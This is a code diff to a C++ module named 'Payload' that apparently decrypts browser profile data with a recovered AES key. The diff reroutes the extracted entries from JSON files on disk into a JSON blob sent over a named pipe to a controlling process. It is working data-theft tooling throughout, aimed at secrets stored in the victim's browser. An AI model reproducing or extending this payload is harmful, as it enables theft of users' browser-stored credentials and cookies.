@@ -591,10 +591,9 @@ namespace Payload
     {
     public:
         DataExtractor(const fs::path &profilePath, const Data::ExtractionConfig &config,
-                      const std::vector<uint8_t> &aesKey, PipeLogger &logger,
-                      const fs::path &baseOutputPath, const std::string &browserName)
+                      const std::vector<uint8_t> &aesKey, PipeLogger &logger)
             : m_profilePath(profilePath), m_config(config), m_aesKey(aesKey),
-              m_logger(logger), m_baseOutputPath(baseOutputPath), m_browserName(browserName) {}
+              m_logger(logger) {}
 
         void Extract()
         {
@@ -644,27 +643,15 @@ namespace Payload
 
             if (!jsonEntries.empty())
             {
-                fs::path outFilePath = m_baseOutputPath / m_browserName / m_profilePath.filename() / (m_config.outputFileName + ".json");
-                std::error_code ec;
-                fs::create_directories(outFilePath.parent_path(), ec);
-                if (ec)
-                {
-                    m_logger.Log("[-] Failed to create directory: " + outFilePath.parent_path().u8string());
-                    return;
-                }
-
-                std::ofstream out(outFilePath, std::ios::trunc);
-                if (!out)
-                    return;
-
-                out << "[\n";
+                std::ostringstream json_payload;
+                json_payload << "{\"" << m_config.outputFileName << "\":";
+                json_payload << "[\n";
                 for (size_t i = 0; i < jsonEntries.size(); ++i)
                 {
-                    out << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
+                    json_payload << jsonEntries[i] << (i == jsonEntries.size() - 1 ? "" : ",\n");
                 }
-                out << "\n]\n";
-
-                m_logger.Log("     [*] " + std::to_string(jsonEntries.size()) + " " + m_config.outputFileName + " extracted to " + outFilePath.u8string());
+                json_payload << "\n]}";
+                m_logger.Log("[JSON_DATA]" + json_payload.str());
             }
         }
 
@@ -673,8 +660,6 @@ namespace Payload
         const Data::ExtractionConfig &m_config;
         const std::vector<uint8_t> &m_aesKey;
         PipeLogger &m_logger;
-        fs::path m_baseOutputPath;
-        std::string m_browserName;
     };
 
     class DecryptionOrchestrator
@@ -711,7 +696,7 @@ namespace Payload
                 m_logger.Log("[*] Processing profile: " + profilePath.filename().u8string());
                 for (const auto &dataConfig : Data::GetExtractionConfigs())
                 {
-                    DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger, m_outputPath, browserConfig.name);
+                    DataExtractor extractor(profilePath, dataConfig, aesKey, m_logger);
                     extractor.Extract();
                 }
             }
@@ -725,13 +710,9 @@ namespace Payload
             char buffer[MAX_PATH + 1] = {0};
             DWORD bytesRead = 0;
             ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
-            ReadFile(m_logger.getHandle(), buffer, sizeof(buffer) - 1, &bytesRead, nullptr);
-            buffer[bytesRead] = '\0';
-            m_outputPath = buffer;
         }
 
         PipeLogger m_logger;
-        fs::path m_outputPath;
     };
 }
 
